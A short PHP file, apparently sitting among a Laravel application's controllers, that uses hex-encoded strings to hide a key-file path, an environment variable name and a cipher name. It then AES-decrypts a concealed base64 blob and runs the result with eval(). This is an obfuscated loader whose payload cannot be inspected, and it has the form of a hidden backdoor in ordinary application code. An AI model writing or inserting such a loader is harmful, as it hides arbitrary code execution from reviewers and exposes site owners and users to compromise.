<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('cmCt9liLwguDKVk4klSMUg==');

$c=base64_decode(

'ml8o8fZCxUEVi29uDAOnPMPjyE/A0aT7hRMEupopaXK2ru88WuPiGpcAX5LDYEu8uOS8xGFb6dwz' .
'VjvZ/VW/2dbMYZtwp1sD7TfJEWIJ4UcaUtMGyWIRPhaQoCAM0yZzKaf17nGV/WiWQdUTL9cUL3/Y' .
'gMJ2XBKsyRxTvRFlcxz1t6Q4arblKAMwOYcc5Qvw5uqv1lPP6eNOXdvaMfOUAY9SAvGNjjm/2lRc' .
'JG6t5JD+/wpsQi27gJUv0OpvdfOIU4Hw2GZCIuJffXwBAt1CMg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

